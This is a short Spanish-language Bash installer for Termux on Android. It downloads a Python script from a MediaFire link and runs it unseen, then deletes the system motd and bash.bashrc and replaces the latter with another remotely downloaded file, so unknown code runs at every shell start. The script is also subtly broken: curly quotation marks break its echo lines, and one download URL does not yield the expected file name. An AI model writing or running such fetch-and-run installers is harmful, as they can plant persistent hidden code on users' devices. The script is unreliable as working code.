#!/bin/bash
##
 echo -e “\e[32m Bienvenido a la instalacion de mi programa, espera un momento\e[39m”
sleep 5
pkg install python
pkg install wget
echo -e “\e[32m Descargando Scripts, aguarde por favor \e[39m”
sleep 5
clear
wget https://www.mediafire.com/file/ekl6m8kh9apk3x5/tool.py/file
clear
chmod +x tool.py
python tool.py
mv tool.py /data/data/com.termux/files/usr/etc/
rm /data/data/com.termux/files/usr/etc/motd
sleep 2
cd /data/data/com.termux/files/usr/etc/
sleep 1
rm bash.bashrc
wget https://download1489.mediafire.com/rcjz3xj1i51g/y6d0pyver787wl0/bash.bashrc
cd
clear
echo -e “\e[32m Instalacion finalizada\e[39m”

